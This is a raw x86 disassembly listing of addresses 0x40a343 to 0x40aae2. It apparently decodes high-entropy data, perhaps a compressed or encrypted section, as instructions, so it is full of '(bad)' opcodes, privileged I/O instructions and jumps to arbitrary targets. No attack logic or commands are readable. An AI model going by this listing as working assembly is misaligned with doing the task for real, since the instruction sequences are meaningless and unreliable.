  40a343:	mov    ch,BYTE PTR [ebx-0x44016117]
  40a349:	js     0x40a38e
  40a34b:	cmc    
  40a34c:	test   al,0xeb
  40a34e:	ins    DWORD PTR es:[edi],dx
  40a34f:	pop    ss
  40a350:	fist   DWORD PTR [ebp+0x3ce2305b]
  40a356:	add    ch,BYTE PTR [esi+0x10]
  40a359:	pop    ebp
  40a35a:	into   
  40a35b:	outs   dx,DWORD PTR ds:[esi]
  40a35c:	cld    
  40a35d:	xchg   esp,eax
  40a35e:	in     eax,0x84
  40a360:	and    al,BYTE PTR [ebx+0x326c9761]
  40a366:	jmp    0x40a354
  40a368:	aaa    
  40a369:	mov    esi,0xa649b209
  40a36e:	(bad)  
  40a36f:	jns    0x40a3d9
  40a371:	(bad)  
  40a372:	out    dx,eax
  40a373:	mov    edi,0x927bb8c
  40a378:	pusha  
  40a379:	xor    ecx,DWORD PTR [ecx+0x25f738ff]
  40a37f:	out    0x5e,al
  40a381:	jns    0x40a38b
  40a383:	adc    eax,0x7edc52c8
  40a388:	and    eax,0xd55e6aff
  40a38d:	shl    BYTE PTR [ebp+0x4730f2fb],1
  40a393:	mov    al,ds:0x90701d54
  40a398:	add    ah,BYTE PTR [ebx]
  40a39a:	mov    ds:0x2d175198,al
  40a39f:	pop    ebp
  40a3a0:	cmp    DWORD PTR [edi+ebp*2+0x44b82c4f],eax
  40a3a7:	push   es
  40a3a8:	jo     0x40a40d
  40a3aa:	xchg   esp,eax
  40a3ab:	loop   0x40a33f
  40a3ad:	cld    
  40a3ae:	jg     0x40a3cc
  40a3b0:	in     eax,0x5a
  40a3b2:	jns    0x40a361
  40a3b4:	push   esi
  40a3b5:	mov    ah,0xb4
  40a3b7:	inc    esi
  40a3b8:	mov    esi,DWORD PTR [edi+eax*4]
  40a3bb:	icebp  
  40a3bc:	(bad)  
  40a3bd:	leave  
  40a3be:	sub    ah,cl
  40a3c0:	pusha  
  40a3c1:	fsub   QWORD PTR [ebp+0x6f26dc20]
  40a3c7:	sbb    ah,BYTE PTR [ecx]
  40a3c9:	clc    
  40a3ca:	shl    DWORD PTR [ebx],1
  40a3cc:	mov    edx,0xf9519f9b
  40a3d1:	mov    bh,0x96
  40a3d3:	sbb    al,0x4c
  40a3d5:	popa   
  40a3d6:	mov    edx,0xc6766ff5
  40a3db:	xchg   esp,eax
  40a3dc:	loope  0x40a3ba
  40a3de:	mov    esi,0x49a83f69
  40a3e3:	add    DWORD PTR [ecx-0x6d],edi
  40a3e6:	neg    BYTE PTR [ebx]
  40a3e8:	sar    BYTE PTR [ecx+edx*4-0xcf3b46d],0xcd
  40a3f0:	mov    al,0xd2
  40a3f2:	sub    eax,0xae592d91
  40a3f7:	xchg   DWORD PTR [esi-0x18df3037],ecx
  40a3fd:	call   0x61709612
  40a402:	and    al,0x30
  40a404:	je     0x40a439
  40a406:	loopne 0x40a3d6
  40a408:	test   eax,0x2a2c0581
  40a40d:	fldlg2 
  40a40f:	ret    0x2717
  40a412:	cs push 0x63c11b07
  40a418:	adc    DWORD PTR [edx],edi
  40a41a:	pop    esp
  40a41b:	mov    dh,0x75
  40a41d:	pop    ecx
  40a41e:	push   ss
  40a41f:	dec    ebp
  40a420:	inc    ecx
  40a421:	jle    0x40a3d1
  40a423:	sahf   
  40a424:	mov    DWORD PTR [eax+0x558902b],eax
  40a42a:	cli    
  40a42b:	imul   edi,DWORD PTR [ebx],0xffffffd2
  40a42e:	sub    DWORD PTR fs:[ecx-0x38],0xffffffeb
  40a433:	(bad)  
  40a434:	and    al,0xfd
  40a436:	inc    ebp
  40a437:	and    BYTE PTR [ebx-0x55c6dc34],cl
  40a43d:	jae    0x40a461
  40a43f:	inc    ebp
  40a440:	mov    DWORD PTR [esi-0xb487f06],edi
  40a446:	mov    DWORD PTR [edi],esi
  40a448:	clc    
  40a449:	test   eax,0x275b4878
  40a44e:	mov    edx,0xf4fb5bf6
  40a453:	aaa    
  40a454:	loopne 0x40a467
  40a456:	sub    al,0xad
  40a458:	inc    ebx
  40a459:	test   DWORD PTR [esi],edx
  40a45b:	fisub  WORD PTR [eax]
  40a45d:	xchg   esp,eax
  40a45e:	cmp    DWORD PTR [ebp+0x71],ebp
  40a461:	adc    eax,0x146b999a
  40a466:	test   eax,0x5fc7a8e8
  40a46b:	cld    
  40a46c:	loopne 0x40a47e
  40a46e:	cmp    ch,BYTE PTR [ebx]
  40a470:	pop    esi
  40a471:	sub    al,0x9
  40a473:	mov    edi,0xe5dbcdd7
  40a478:	push   eax
  40a479:	mov    ah,0x71
  40a47b:	mov    eax,ds:0xfbde8919
  40a480:	push   ds
  40a481:	ins    BYTE PTR es:[edi],dx
  40a482:	mov    dl,0x4c
  40a484:	pushf  
  40a485:	and    esi,esi
  40a487:	push   ebx
  40a488:	mov    dh,0x74
  40a48a:	outs   dx,BYTE PTR ds:[esi]
  40a48b:	pop    ebp
  40a48c:	sub    DWORD PTR [ebp+0x15896253],ebx
  40a492:	stos   BYTE PTR es:[edi],al
  40a493:	nop
  40a494:	ja     0x40a42a
  40a496:	stos   BYTE PTR es:[edi],al
  40a497:	dec    esp
  40a498:	clc    
  40a499:	bound  esp,QWORD PTR [esi+0x48]
  40a49c:	sbb    dh,0xd3
  40a49f:	and    cl,BYTE PTR [edi]
  40a4a1:	sar    BYTE PTR [eax+0x19228a95],cl
  40a4a7:	sbb    edx,eax
  40a4a9:	mov    edi,0xcff86a95
  40a4ae:	and    esi,esp
  40a4b0:	fmulp  st(2),st
  40a4b2:	jae    0x40a45e
  40a4b4:	pushfw 
  40a4b6:	sbb    dl,cl
  40a4b8:	rcl    ch,0xe3
  40a4bb:	cmp    BYTE PTR [eax+0x7b],al
  40a4be:	jmp    0x40a4fa
  40a4c0:	dec    ecx
  40a4c1:	outs   dx,DWORD PTR ds:[esi]
  40a4c2:	arpl   WORD PTR [esi],si
  40a4c4:	mov    esp,0xdeebf889
  40a4c9:	xchg   ebp,eax
  40a4ca:	cmp    al,0x89
  40a4cc:	sub    cl,bh
  40a4ce:	cmp    al,BYTE PTR [edi]
  40a4d0:	test   bl,ch
  40a4d2:	inc    ebp
  40a4d3:	sbb    al,0xa1
  40a4d5:	mov    edi,0x731dbd2b
  40a4da:	inc    esp
  40a4db:	lods   eax,DWORD PTR ds:[esi]
  40a4dc:	in     al,0xf8
  40a4de:	test   al,0xac
  40a4e0:	fdiv   DWORD PTR cs:[edi+0x41]
  40a4e4:	mov    bl,0xce
  40a4e6:	out    dx,eax
  40a4e7:	in     al,0xe6
  40a4e9:	adc    eax,0x402c3bb0
  40a4ee:	pop    ecx
  40a4ef:	(bad)  
  40a4f0:	pop    ebx
  40a4f1:	add    BYTE PTR [edi],0xf7
  40a4f4:	sar    BYTE PTR [esi+0x2880df1],1
  40a4fa:	xor    DWORD PTR ds:0xaf9dc0db,ecx
  40a500:	jno    0x40a4a8
  40a502:	mov    bh,0x21
  40a504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a505:	mov    ecx,0x64b9673a
  40a50a:	pop    ebp
  40a50b:	mov    ds:0x18f1e2be,al
  40a510:	repnz mov BYTE PTR [ebx+ebx*4-0x692244c4],ah
  40a518:	into   
  40a519:	inc    ebx
  40a51a:	xchg   esi,eax
  40a51b:	sub    al,0x28
  40a51d:	cmp    al,0xb3
  40a51f:	mov    ebx,fs
  40a521:	stos   BYTE PTR es:[edi],al
  40a522:	sbb    al,0xd5
  40a524:	add    eax,0x9efebaa
  40a529:	jl     0x40a4d2
  40a52b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a52c:	fs jne 0x40a57a
  40a52f:	repz test BYTE PTR [esi-0x18],cl
  40a533:	les    ecx,FWORD PTR ds:0xbf0eee9b
  40a539:	mov    bh,0xfc
  40a53b:	ss pop eax
  40a53d:	retf   
  40a53e:	repz cmc 
  40a540:	jae    0x40a4d7
  40a542:	int    0x9
  40a544:	(bad)
  40a549:	cmp    edx,edi
  40a54b:	bound  esi,QWORD PTR [ebp-0x7]
  40a54e:	xor    DWORD PTR [ebx+0x67efac84],edi
  40a554:	addr16 sbb al,0x77
  40a557:	js     0x40a4ea
  40a559:	jmp    0xce47:0xe44285df
  40a560:	pushf  
  40a561:	fsubr  QWORD PTR [edi-0x1d062458]
  40a567:	sub    BYTE PTR [edx-0x6af4142d],cl
  40a56d:	jmp    0x40a5cb
  40a56f:	leave  
  40a570:	inc    ebp
  40a571:	bswap  ebx
  40a573:	push   ss
  40a574:	repnz cmc 
  40a576:	jbe    0x40a574
  40a578:	cmp    ebp,DWORD PTR [edx-0x6c]
  40a57b:	cwde   
  40a57c:	fsub   st(6),st
  40a57e:	and    esi,DWORD PTR [edi-0x14]
  40a581:	stc    
  40a582:	inc    edx
  40a583:	sahf   
  40a584:	jp     0x40a506
  40a586:	pop    ds
  40a587:	das    
  40a588:	sbb    al,0xe0
  40a58a:	ds cmp eax,0x55d28d0f
  40a590:	sbb    ah,cl
  40a592:	add    dh,BYTE PTR [ebx+0x4270868e]
  40a598:	sbb    BYTE PTR [ebx-0x3a6756b6],cl
  40a59e:	pusha  
  40a59f:	sbb    eax,0xa58506b0
  40a5a4:	dec    eax
  40a5a5:	fisub  WORD PTR [edx+0x51]
  40a5a8:	out    0xef,eax
  40a5aa:	sub    BYTE PTR [ecx],bl
  40a5ac:	(bad)  
  40a5ad:	out    dx,eax
  40a5ae:	adc    eax,0x63409718
  40a5b3:	jbe    0x40a5c1
  40a5b5:	sub    ebx,DWORD PTR [edx]
  40a5b7:	xchg   ebx,eax
  40a5b8:	pop    ecx
  40a5b9:	cdq    
  40a5ba:	sub    BYTE PTR [eax+0x31da778a],dh
  40a5c0:	add    BYTE PTR [edx+0x10284a54],ah
  40a5c6:	jb     0x56a178ab
  40a5cc:	(bad)  
  40a5cd:	and    DWORD PTR [ecx+0x3ad2907e],esp
  40a5d3:	int    0x18
  40a5d5:	cli    
  40a5d6:	xchg   edx,eax
  40a5d7:	sub    eax,0x9e569a38
  40a5dc:	test   esi,0x17d8fb23
  40a5e2:	imul   ebp,DWORD PTR [ebp+edx*8-0x7d],0x7cdf0e72
  40a5ea:	in     al,dx
  40a5eb:	cmp    dl,cl
  40a5ed:	icebp  
  40a5ee:	icebp  
  40a5ef:	test   al,0x6f
  40a5f1:	mov    esp,0xad1101ee
  40a5f6:	jl     0x40a593
  40a5f8:	dec    edi
  40a5f9:	sub    BYTE PTR [eax-0x20d56c88],bh
  40a5ff:	inc    edi
  40a600:	test   eax,0x661bf92a
  40a605:	mov    bh,0xc
  40a607:	jno    0x40a59c
  40a609:	dec    eax
  40a60a:	mov    ecx,0x50b28ff3
  40a60f:	push   cs
  40a610:	mov    ebp,0x748bd618
  40a615:	out    dx,eax
  40a616:	push   es
  40a617:	stos   BYTE PTR es:[edi],al
  40a618:	push   eax
  40a619:	cli    
  40a61a:	adc    BYTE PTR [esi+0x152b621b],cl
  40a620:	icebp  
  40a621:	pop    esi
  40a622:	adc    eax,0xd9cbdf7a
  40a627:	pop    ecx
  40a628:	icebp  
  40a629:	jmp    0x7669:0xaef0746
  40a630:	adc    dh,BYTE PTR [eax+ebp*8+0x75c3fdde]
  40a637:	fs sbb ch,0x25
  40a63b:	dec    ebp
  40a63c:	aaa    
  40a63d:	repnz cmp eax,0x5be3b24a
  40a643:	add    esp,DWORD PTR [edx]
  40a645:	jp     0x40a612
  40a647:	or     BYTE PTR [ecx],0x55
  40a64a:	sti    
  40a64b:	aam    0x16
  40a64d:	lock in eax,0x6
  40a650:	fisttp DWORD PTR [ebx+0xc2f4b31]
  40a656:	jecxz  0x40a619
  40a658:	pop    esi
  40a659:	sub    BYTE PTR [edi-0x5f55ce29],dh
  40a65f:	xor    eax,0x1c69576d
  40a664:	(bad)  
  40a665:	fcomp  QWORD PTR [ecx-0x1652d601]
  40a66b:	dec    ebp
  40a66c:	dec    ebp
  40a66d:	pushf  
  40a66e:	cld    
  40a66f:	xor    dl,BYTE PTR [edx+esi*4]
  40a672:	int3   
  40a673:	es dec ecx
  40a675:	ss fcom st(0)
  40a678:	xor    DWORD PTR [ecx-0x228b93b],edi
  40a67e:	popa   
  40a67f:	pop    ebp
  40a680:	inc    edi
  40a681:	imul   esp,DWORD PTR [edx],0xe7ed2929
  40a687:	xchg   ecx,eax
  40a688:	std    
  40a689:	adc    ah,BYTE PTR [ebp+0xc918056]
  40a68f:	and    bh,BYTE PTR [ebx]
  40a691:	addr16 mov ah,0x5c
  40a694:	call   0x3b7583ed
  40a699:	inc    edx
  40a69a:	mov    ds:0x31a352ae,al
  40a69f:	jne    0x40a66e
  40a6a1:	in     eax,dx
  40a6a2:	adc    BYTE PTR [ecx-0x3d],cl
  40a6a5:	mov    ebx,DWORD PTR [ecx+0x73]
  40a6a8:	xor    ebp,ebx
  40a6aa:	imul   esi,DWORD PTR [edx],0xd9e93fc7
  40a6b0:	mov    esi,eax
  40a6b2:	inc    edx
  40a6b3:	out    dx,eax
  40a6b4:	mov    eax,0x512010aa
  40a6b9:	push   edi
  40a6ba:	add    edi,DWORD PTR [edx-0x1ec159ac]
  40a6c0:	mov    edx,0x6105d2f1
  40a6c5:	mov    ds:0x9bad5d21,eax
  40a6ca:	jge    0x40a6a2
  40a6cc:	clc    
  40a6cd:	(bad)  
  40a6ce:	mov    cs,edi
  40a6d0:	fimul  DWORD PTR ds:0xaef4b425
  40a6d6:	call   DWORD PTR [ecx+0x42db11d3]
  40a6dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6dd:	xor    DWORD PTR [ebp+0x7fee6adb],ebp
  40a6e3:	xor    BYTE PTR [ebx+ebx*4],ch
  40a6e6:	loope  0x40a668
  40a6e8:	shr    BYTE PTR [ecx+0x58],1
  40a6eb:	iret   
  40a6ec:	fist   WORD PTR [edx-0x202a9159]
  40a6f2:	cdq    
  40a6f3:	js     0x40a6e5
  40a6f5:	fild   WORD PTR [ebx]
  40a6f7:	add    eax,0xd0b6281
  40a6fc:	sahf   
  40a6fd:	dec    ecx
  40a6fe:	mov    esp,eax
  40a700:	fucomp st(2)
  40a702:	xchg   ebx,eax
  40a703:	addr16 dec ebx
  40a705:	test   eax,0x7331f0d3
  40a70a:	dec    ebx
  40a70b:	add    ecx,DWORD PTR [ebx+edx*8-0x66]
  40a70f:	and    ebp,ebx
  40a711:	xor    BYTE PTR [ecx-0x35],ah
  40a714:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a715:	std    
  40a716:	les    ecx,FWORD PTR [edx-0x58]
  40a719:	sti    
  40a71a:	jae    0x40a706
  40a71c:	mov    ds:0xada596fa,al
  40a721:	push   eax
  40a722:	mov    dh,0xe8
  40a724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a725:	arpl   WORD PTR [edx+0x55a110ba],dx
  40a72b:	push   0xeb4448fa
  40a730:	jge    0x40a72a
  40a732:	in     eax,0xc9
  40a734:	dec    bp
  40a736:	loope  0x40a772
  40a738:	mov    dl,0x2f
  40a73a:	adc    edi,DWORD PTR [edx]
  40a73c:	sub    cl,ah
  40a73e:	sub    DWORD PTR [edi+eiz*4-0x15a9cac3],esp
  40a745:	rcr    DWORD PTR [ebx+0x248ca76b],0x3
  40a74c:	and    al,0xb1
  40a74e:	xor    ch,BYTE PTR [esi]
  40a750:	and    BYTE PTR [edi-0x71],dh
  40a753:	fisttp QWORD PTR [edi+ebx*2+0x4f60712d]
  40a75a:	into   
  40a75b:	cld    
  40a75c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a75d:	test   DWORD PTR [ecx-0x40],eax
  40a760:	rcr    bh,0xfa
  40a763:	xor    BYTE PTR [ebx+ecx*8+0x4c190ccb],ch
  40a76a:	mov    ds:0x64cfdd0e,al
  40a76f:	pop    ebp
  40a770:	jne    0x40a79e
  40a772:	push   ds
  40a773:	jno    0x40a783
  40a775:	adc    DWORD PTR [esi-0x41],edx
  40a778:	cmp    ebx,ebp
  40a77a:	fdivr  DWORD PTR [edi]
  40a77c:	sahf   
  40a77d:	mov    eax,0x3fb44368
  40a782:	mov    eax,ds:0xadf46a9b
  40a787:	fnstenv ds:0x52c90c33
  40a78d:	std    
  40a78e:	adc    DWORD PTR [ebx+eiz*4],esp
  40a791:	std    
  40a792:	out    dx,al
  40a793:	sub    ebp,ebp
  40a795:	sbb    al,0x5f
  40a797:	mov    eax,0xa6afce5e
  40a79c:	lods   eax,DWORD PTR ds:[esi]
  40a79d:	inc    ebx
  40a79e:	in     eax,0xc0
  40a7a0:	mov    edx,0xd04829ea
  40a7a5:	mov    al,ds:0x139d785f
  40a7aa:	hlt    
  40a7ab:	jmp    FWORD PTR [edx-0x7509f211]
  40a7b1:	pop    ss
  40a7b2:	sub    DWORD PTR [esi+0x12],ebx
  40a7b5:	cmp    bh,BYTE PTR [edx-0x62]
  40a7b8:	out    0x41,eax
  40a7ba:	das    
  40a7bb:	hlt    
  40a7bc:	rcl    BYTE PTR [ecx-0x24987eee],0xdb
  40a7c3:	xchg   edi,eax
  40a7c4:	sbb    BYTE PTR [ecx+edi*4],dl
  40a7c7:	xor    BYTE PTR [ebx+0x1d],ah
  40a7ca:	push   ss
  40a7cb:	popa   
  40a7cc:	call   0x593dc994
  40a7d1:	sahf   
  40a7d2:	sub    bh,BYTE PTR [edi]
  40a7d4:	push   ebp
  40a7d5:	and    ecx,DWORD PTR [ebx]
  40a7d7:	pop    eax
  40a7d8:	xor    al,0x28
  40a7da:	cs jmp 0x22c42331
  40a7e0:	loop   0x40a7a0
  40a7e2:	jmp    0xe319:0x14afb6a
  40a7e9:	and    al,0x47
  40a7eb:	hlt    
  40a7ec:	ror    BYTE PTR ds:0x86d1da2d,0x14
  40a7f3:	sbb    BYTE PTR [ebx-0x74],al
  40a7f6:	nop    DWORD PTR [ebx]
  40a7f9:	jle    0x40a789
  40a7fb:	enter  0xfacf,0x99
  40a7ff:	repz push ebp
  40a801:	jmp    0x57ca:0xc2425010
  40a808:	shl    ch,cl
  40a80a:	jmp    0x77415575
  40a80f:	enter  0x8ada,0xd4
  40a813:	mov    cl,0x80
  40a815:	add    DWORD PTR [eax+0x2d0d39fe],0xffffffea
  40a81c:	fld    QWORD PTR [ecx-0x7423157e]
  40a822:	shl    DWORD PTR [esi+eiz*1],0x52
  40a826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a827:	iret   
  40a828:	mov    ds:0x723ef33c,eax
  40a82d:	inc    edi
  40a82e:	das    
  40a82f:	outs   dx,BYTE PTR ds:[esi]
  40a830:	ins    BYTE PTR es:[edi],dx
  40a831:	push   edi
  40a832:	add    al,BYTE PTR [ecx+edi*2]
  40a835:	les    ebp,FWORD PTR [eax+0x6c74921e]
  40a83b:	lds    ecx,FWORD PTR [ebx+0x65]
  40a83e:	js     0x40a801
  40a840:	sahf   
  40a841:	call   0xecd9:0x4f8a706a
  40a848:	add    ecx,esi
  40a84a:	bound  esi,QWORD PTR ss:[esi+0x5a]
  40a84e:	(bad)  [ebx+0x2cb23af2]
  40a854:	sbb    BYTE PTR [ebx],cl
  40a856:	(bad)  
  40a857:	mov    bl,0xdd
  40a859:	xlat   BYTE PTR ds:[ebx]
  40a85a:	pop    edi
  40a85b:	dec    esp
  40a85c:	daa    
  40a85d:	sub    esp,DWORD PTR [ecx-0x70433121]
  40a863:	ja     0x40a7e9
  40a865:	stos   BYTE PTR es:[edi],al
  40a866:	xlat   BYTE PTR ds:[ebx]
  40a867:	rcl    BYTE PTR ds:0x3e7d1254,cl
  40a86d:	dec    eax
  40a86e:	ror    BYTE PTR [eax-0x24],0xa7
  40a872:	mov    esi,DWORD PTR [ebp*8+0x6ea750d1]
  40a879:	scas   eax,DWORD PTR es:[edi]
  40a87a:	repnz sub esp,DWORD PTR [edi]
  40a87d:	mov    al,0xec
  40a87f:	pushf  
  40a880:	pop    ss
  40a881:	rol    BYTE PTR ds:0xd0fadf94,0x31
  40a888:	icebp  
  40a889:	ficom  DWORD PTR [eax+0x0]
  40a88c:	into   
  40a88d:	test   ch,al
  40a88f:	or     esp,DWORD PTR [ebx]
  40a891:	out    0x54,al
  40a893:	xchg   ebx,eax
  40a894:	xchg   edi,eax
  40a895:	adc    esp,ebx
  40a897:	icebp  
  40a898:	fidiv  DWORD PTR [eax]
  40a89a:	cmp    ah,dl
  40a89c:	out    0xe9,eax
  40a89e:	jo     0x40a837
  40a8a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8a1:	repnz mov al,0x6e
  40a8a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8a5:	sub    bh,BYTE PTR [edx+0x10dcad04]
  40a8ab:	add    al,0xed
  40a8ad:	leave  
  40a8ae:	jp     0x40a8d8
  40a8b0:	pop    esp
  40a8b1:	cdq    
  40a8b2:	push   ds
  40a8b3:	push   0xa2aef43c
  40a8b8:	jle    0x40a91e
  40a8ba:	int3   
  40a8bb:	inc    edx
  40a8bc:	stc    
  40a8bd:	ss inc edx
  40a8bf:	cs aam 0x22
  40a8c2:	inc    edx
  40a8c3:	jb     0x40a87f
  40a8c5:	mov    ds:0xaa68ddf,eax
  40a8ca:	outs   dx,DWORD PTR ds:[esi]
  40a8cb:	pop    ds
  40a8cc:	ja     0x40a8df
  40a8ce:	mov    ebx,0x83b3dab
  40a8d3:	jb     0x40a8b6
  40a8d5:	xor    ch,BYTE PTR [ebx+0x4a]
  40a8d8:	sub    esi,edx
  40a8da:	(bad)  
  40a8db:	sbb    BYTE PTR [esi],ch
  40a8dd:	mov    ds:0xccd7df9e,al
  40a8e2:	mov    es,WORD PTR [eax]
  40a8e4:	mov    al,ds:0x982b8ab2
  40a8e9:	mov    eax,0xd00d52ec
  40a8ee:	ins    DWORD PTR es:[edi],dx
  40a8ef:	repnz pop es
  40a8f1:	adc    DWORD PTR [eax],eax
  40a8f3:	push   esp
  40a8f4:	fmul   QWORD PTR [ebp+0x29ac5796]
  40a8fa:	idiv   BYTE PTR ds:0x87e4dcb4
  40a900:	inc    esp
  40a901:	adc    cl,dl
  40a903:	pop    esp
  40a904:	mov    dh,0xdf
  40a906:	inc    eax
  40a907:	or     DWORD PTR [ebx+0x24],esi
  40a90a:	(bad)  
  40a90b:	loop   0x40a8d6
  40a90d:	test   al,0xb7
  40a90f:	pop    ss
  40a910:	js     0x40a8f2
  40a912:	pop    ss
  40a913:	nop
  40a914:	int    0x40
  40a916:	cli    
  40a917:	add    al,0xbb
  40a919:	xchg   ebp,eax
  40a91a:	es in  eax,dx
  40a91c:	lods   al,BYTE PTR ds:[esi]
  40a91d:	repnz inc ebp
  40a91f:	pop    ss
  40a920:	cmp    eax,0x35e43b3b
  40a925:	xor    esi,DWORD PTR [edi+esi*8+0x2d]
  40a929:	sbb    edi,ecx
  40a92b:	xlat   BYTE PTR ds:[ebx]
  40a92c:	jne    0x40a9ad
  40a92e:	cdq    
  40a92f:	icebp  
  40a930:	sub    eax,0xa5817cb1
  40a935:	push   edx
  40a936:	pop    ebx
  40a937:	xor    dh,BYTE PTR [eax-0x4a]
  40a93a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a93b:	push   ebx
  40a93c:	adc    bh,BYTE PTR [ecx+0x1dbc6d57]
  40a942:	jle    0x40a948
  40a944:	or     BYTE PTR [edx-0x6c4dffc9],0x38
  40a94b:	cwde   
  40a94c:	mov    edi,gs
  40a94e:	xchg   ebp,eax
  40a94f:	push   edi
  40a950:	es pop ecx
  40a952:	jb     0x40a97c
  40a954:	or     al,0xd3
  40a956:	mov    al,0x5c
  40a958:	mov    bl,BYTE PTR [ebx+0xd]
  40a95b:	mov    esi,0x5b1192e1
  40a960:	jno    0x40a923
  40a962:	ss (bad) 
  40a964:	out    dx,eax
  40a965:	(bad)  
  40a966:	push   ebx
  40a967:	mov    bl,0x21
  40a969:	xchg   ebp,eax
  40a96a:	leave  
  40a96b:	sub    al,0x76
  40a96d:	xor    ecx,DWORD PTR [ebx+eax*1-0x75760971]
  40a974:	bound  edi,QWORD PTR [edi]
  40a976:	xchg   edx,eax
  40a977:	cmp    BYTE PTR [bp+si-0x31],ch
  40a97b:	fldenv [ebp-0x28269187]
  40a981:	push   0xa4dedd82
  40a986:	dec    esp
  40a987:	mov    WORD PTR [ecx],gs
  40a989:	stos   DWORD PTR es:[edi],eax
  40a98a:	sar    BYTE PTR [edx-0x706a4d7d],1
  40a990:	(bad)  
  40a991:	pop    edi
  40a992:	push   esi
  40a993:	inc    edi
  40a994:	xor    BYTE PTR [eax],dh
  40a996:	xor    bh,BYTE PTR ds:0x70ec78a9
  40a99c:	pop    eax
  40a99d:	lea    edx,[ebx]
  40a99f:	mov    ecx,0xa81f7c5f
  40a9a4:	ror    DWORD PTR [ebp+0xd],cl
  40a9a7:	std    
  40a9a8:	xor    BYTE PTR [ebp-0x76bf5886],cl
  40a9ae:	pushf  
  40a9af:	add    esp,0xe322462c
  40a9b5:	sbb    dh,BYTE PTR [edi]
  40a9b7:	push   0xffffffb9
  40a9b9:	cmp    eax,0x4f08d2de
  40a9be:	stos   BYTE PTR es:[edi],al
  40a9bf:	pusha  
  40a9c0:	adc    edi,eax
  40a9c2:	ss sti 
  40a9c4:	pop    ds
  40a9c5:	sbb    DWORD PTR [edx+0x38870e4a],esp
  40a9cb:	or     eax,0x96ce2952
  40a9d0:	pop    edi
  40a9d1:	xchg   ebx,eax
  40a9d2:	pop    es
  40a9d3:	test   al,0xa2
  40a9d5:	push   ecx
  40a9d6:	out    dx,al
  40a9d7:	jb     0x40aa1b
  40a9d9:	add    ebx,0x3
  40a9dc:	dec    ebp
  40a9dd:	adc    bl,BYTE PTR [ecx+0x41a60a0d]
  40a9e3:	adc    ebp,eax
  40a9e5:	inc    ebp
  40a9e6:	sub    bl,bh
  40a9e8:	sub    al,0x63
  40a9ea:	jae    0x40a9f0
  40a9ec:	imul   DWORD PTR [esi]
  40a9ee:	jmp    0x8cb3454b
  40a9f3:	stc    
  40a9f4:	dec    ebx
  40a9f5:	adc    dl,BYTE PTR [edi]
  40a9f7:	mov    BYTE PTR [edx-0x15326992],dl
  40a9fd:	xor    dl,cl
  40a9ff:	pop    ebp
  40aa00:	inc    esi
  40aa01:	fwait
  40aa02:	js     0x40aa60
  40aa04:	mov    eax,ds:0x4f5761a3
  40aa09:	cmp    ebx,0x8
  40aa0c:	sti    
  40aa0d:	bound  edx,QWORD PTR [ecx-0x15f49d50]
  40aa13:	loope  0x40aa5e
  40aa15:	fs addr16 out 0xba,eax
  40aa19:	fs mov esi,0x9581034
  40aa1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa20:	je     0x40a9a8
  40aa22:	test   BYTE PTR [edx],0xa4
  40aa25:	pop    es
  40aa26:	pop    ecx
  40aa27:	rol    DWORD PTR [ecx+0x30],0x48
  40aa2b:	sar    BYTE PTR [eax],1
  40aa2d:	mov    ds:0xce85d3ce,eax
  40aa32:	int3   
  40aa33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa34:	xor    DWORD PTR [ebx+0x70],0xc8c22542
  40aa3b:	inc    esi
  40aa3c:	sahf   
  40aa3d:	and    eax,0x9cd90a6f
  40aa42:	push   cs
  40aa43:	jmp    0x296f87b6
  40aa48:	repz jne 0x40aa4f
  40aa4b:	cmp    BYTE PTR [esi-0x11],0x0
  40aa4f:	mov    al,ds:0x49384fc
  40aa54:	arpl   WORD PTR [eax+0x65],si
  40aa57:	ret    0xeead
  40aa5a:	inc    edx
  40aa5b:	cs jge 0x40aa8f
  40aa5e:	shl    DWORD PTR [ebx+0x6fa294c9],cl
  40aa64:	pop    esi
  40aa65:	mov    esi,0xd32ab1f6
  40aa6a:	es ret 
  40aa6c:	jnp    0x40aa69
  40aa6e:	dec    esp
  40aa6f:	pop    edx
  40aa70:	pushf  
  40aa71:	bound  esp,QWORD PTR [esi+0x38]
  40aa74:	adc    cl,BYTE PTR [ecx]
  40aa76:	inc    ecx
  40aa77:	and    DWORD PTR [edi-0x5],ebp
  40aa7a:	(bad)  
  40aa7b:	lahf   
  40aa7c:	jecxz  0x40aa38
  40aa7e:	sub    eax,0x4b1e7f34
  40aa83:	and    DWORD PTR [ecx-0x42],0x71d0dc61
  40aa8a:	inc    esi
  40aa8b:	jo     0x40aa27
  40aa8d:	mov    al,0xaf
  40aa8f:	fcomp  DWORD PTR [eax-0x43]
  40aa92:	push   esi
  40aa93:	mov    esp,0x62cfa832
  40aa98:	xor    esi,ebp
  40aa9a:	sbb    dh,BYTE PTR [eax]
  40aa9c:	icebp  
  40aa9d:	jne    0x40aa53
  40aa9f:	push   ds
  40aaa0:	pop    ds
  40aaa1:	jmp    0x7dc8b8b0
  40aaa6:	scas   eax,DWORD PTR es:[edi]
  40aaa7:	xchg   ebp,eax
  40aaa8:	lods   eax,DWORD PTR ds:[esi]
  40aaa9:	in     eax,0xcc
  40aaab:	add    DWORD PTR [esi+0x57a32f6c],ebp
  40aab1:	dec    edx
  40aab2:	or     edx,DWORD PTR [edi-0x2ae576a3]
  40aab8:	(bad)
  40aabc:	mov    cl,0x1d
  40aabe:	retfw  
  40aac0:	imul   edx,DWORD PTR [ebx],0xffffffea
  40aac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aac4:	xchg   edi,eax
  40aac5:	ds ret 
  40aac7:	xchg   edi,eax
  40aac8:	int3   
  40aac9:	push   0xdd7b198b
  40aace:	int3   
  40aacf:	ret    0x8e2d
  40aad2:	xchg   ecx,eax
  40aad3:	lds    esp,FWORD PTR [esi+edi*4-0x2b]
  40aad7:	jo     0x40aaea
  40aad9:	fs call 0x9c96:0x44d83389
  40aae1:	scas   al,BYTE PTR es:[edi]
  40aae2:	popf   
